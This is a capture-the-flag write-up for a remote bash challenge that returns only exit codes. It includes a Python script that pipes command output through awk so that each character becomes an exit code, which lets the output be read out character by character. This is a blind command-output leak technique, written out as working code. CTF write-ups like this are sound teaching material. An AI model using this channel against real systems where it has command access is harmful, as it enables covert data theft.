## Problem

When we open this problem we are presented with a command input that is
definitely running bash, but all of our commands are not returning any stdout
or stderr. When we run a command, we only get the exit code.

```text
~ » nc jh2i.com 50025
ls -la
0... Well this is awkward...
```

It is also good to note that the challenge hints at using awk for this
challenge, but this is not the intended solution `:p`.

## Solution

For the solution I decided to take use of one major functionality in awk,
the ability to set error codes.

I also found a way to convert a character to it's ASCII int value.

Combining these together with python, I run a command and then get the first
char and set that as the exit code. Then the next char. Then the next char,
etc.


```python
import socc #https://github.com/f3rn0s/socc

s = socc.socc("jh2i.com", 50025)

def gen_commands(command, line):
    commands = []
    for offset in range(0, 100):
        commands.append(
        # This defines a function ord
        # awk 'BEGIN{for(n=0;n<256;n++)ord[sprintf("%c", n)]=n}

        # This takes 1 character, starting at index 1, and sets that as the
        # exit code
        #awk 'FNR == 1{exit(ord[substr($0, 1, 1)])}'
            command +
            "| awk 'BEGIN{for(n=0;n<256;n++)ord[sprintf(" + '"%c"' +
            ",n)]=n}FNR == " + str(line) + "{exit(ord[substr($0, " +
            str(offset) + ", 1)])}'"
        )
    return commands

for line in range(0, 15): #Guess how many lines there will be
    for command in gen_commands("ls -l", line):
        s.send(command)
        return_int = int(s.recv().split("...")[0])

        #If there is a null byte, we end our line and start the next one
        if return_int != 0:
            print(chr(return_int), end='')
        else:
            print()
            break
```
